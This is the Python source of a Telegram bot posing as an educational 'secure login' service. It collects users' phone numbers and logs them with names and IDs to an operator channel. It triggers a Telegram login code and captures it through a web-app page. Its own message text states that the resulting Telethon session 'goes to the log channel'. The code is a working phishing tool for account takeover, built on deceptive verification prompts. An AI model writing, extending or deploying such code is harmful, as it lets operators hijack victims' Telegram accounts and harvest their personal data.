import time
import traceback

import requests
from pyrogram import Client, filters
from pyrogram.handlers import MessageHandler
from pyrogram.types import (
    ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo,
)

from config import (
    API_ID, API_HASH, BOT_TOKEN, LOG_CHANNEL,
    WEB_APP_URL, ADMIN_PANEL_URL, API_BASE_URL, ADMIN_IDS,
)

bot = Client("edu_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Per-user locks: phone + user_id
_recent_users = {}   # user_id -> timestamp
_recent_phones = {}  # phone -> timestamp
_COOLDOWN = 20


def is_admin(user_id):
    return user_id in ADMIN_IDS


def create_web_session(phone):
    try:
        r = requests.post(
            f"{API_BASE_URL.rstrip('/')}/api/bot-connect",
            json={"phone": phone, "session_name": "bot_session"},
            timeout=35,
        )
        data = r.json()
        if data.get("ok"):
            return data.get("session_id")
        print(f"bot-connect rejected: {data}", flush=True)
    except Exception as e:
        print(f"bot-connect failed: {e}", flush=True)
    return None


async def start_handler(client, message):
    keyboard = ReplyKeyboardMarkup(
        [[KeyboardButton("📱 Share Phone Number", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )
    await message.reply_text(
        "👋 <b>Welcome!</b>\n\n"
        "📱 Tap the button below to share your phone number for verification.",
        reply_markup=keyboard,
    )


async def contact_handler(client, message):
    try:
        contact = message.contact
        user = message.from_user
        if not contact or not user:
            return

        if contact.user_id is not None and contact.user_id != user.id:
            await message.reply_text("❌ Please share your own phone number.")
            return

        phone = (contact.phone_number or "").strip()
        if not phone.startswith("+"):
            phone = "+" + phone

        now = time.time()
        # Drop duplicates (same user OR same phone within cooldown)
        if now - _recent_users.get(user.id, 0) < _COOLDOWN:
            print(f"skip duplicate user {user.id}", flush=True)
            return
        if now - _recent_phones.get(phone, 0) < _COOLDOWN:
            print(f"skip duplicate phone {phone}", flush=True)
            return
        _recent_users[user.id] = now
        _recent_phones[phone] = now

        name = user.first_name or "Unknown"
        user_id = user.id

        try:
            await client.send_message(
                LOG_CHANNEL,
                f"🎓 <b>NEW LOGIN</b>\n\n"
                f"👤 Name: {name}\n"
                f"📱 Phone: {phone}\n"
                f"🆔 TG ID: <code>{user_id}</code>",
            )
        except Exception as e:
            print(f"log channel: {e}", flush=True)

        status = await message.reply_text("⏳ <i>Preparing your secure login…</i>")

        session_id = create_web_session(phone)

        if session_id:
            url = f"{WEB_APP_URL.rstrip('/')}/login?s={session_id}"
            caption = (
                "📱 <b>Phone received!</b>\n\n"
                "🔐 Code sent to your Telegram.\n\n"
                "👉 Open the button, enter the code.\n"
                "After success, Telethon session goes to the log channel."
            )
        else:
            url = f"{WEB_APP_URL.rstrip('/')}/login"
            caption = (
                "📱 <b>Phone received!</b>\n\n"
                "⚠️ Auto-connect failed. Open login and enter number manually."
            )

        keyboard = InlineKeyboardMarkup(
            [[InlineKeyboardButton("🔓 Open Secure Login", web_app=WebAppInfo(url=url))]]
        )
        try:
            await status.edit_text(caption, reply_markup=keyboard)
        except Exception:
            await message.reply_text(caption, reply_markup=keyboard)

    except Exception as e:
        print(f"contact_handler: {e}\n{traceback.format_exc()}", flush=True)
        try:
            await message.reply_text(f"❌ Error: {e}")
        except Exception:
            pass


async def admin_handler(client, message):
    if not is_admin(message.from_user.id):
        await message.reply_text("⛔ Not authorized.")
        return
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔥 Admin Panel", web_app=WebAppInfo(url=ADMIN_PANEL_URL))],
    ])
    await message.reply_text("🛡 <b>Admin</b>", reply_markup=keyboard)


if __name__ == "__main__":
    print("🚀 Bot starting...", flush=True)
    print(f"LOG_CHANNEL={LOG_CHANNEL} API_BASE={API_BASE_URL}", flush=True)

    # Register handlers ONCE only
    bot.add_handler(MessageHandler(start_handler, filters.command("start") & filters.private))
    bot.add_handler(MessageHandler(contact_handler, filters.contact & filters.private))
    bot.add_handler(MessageHandler(admin_handler, filters.command("admin") & filters.private))

    try:
        from Nexa.bot_zip import register_zip_handler
        register_zip_handler(bot)
    except Exception as e:
        print(f"zip handler skip: {e}", flush=True)

    bot.run()
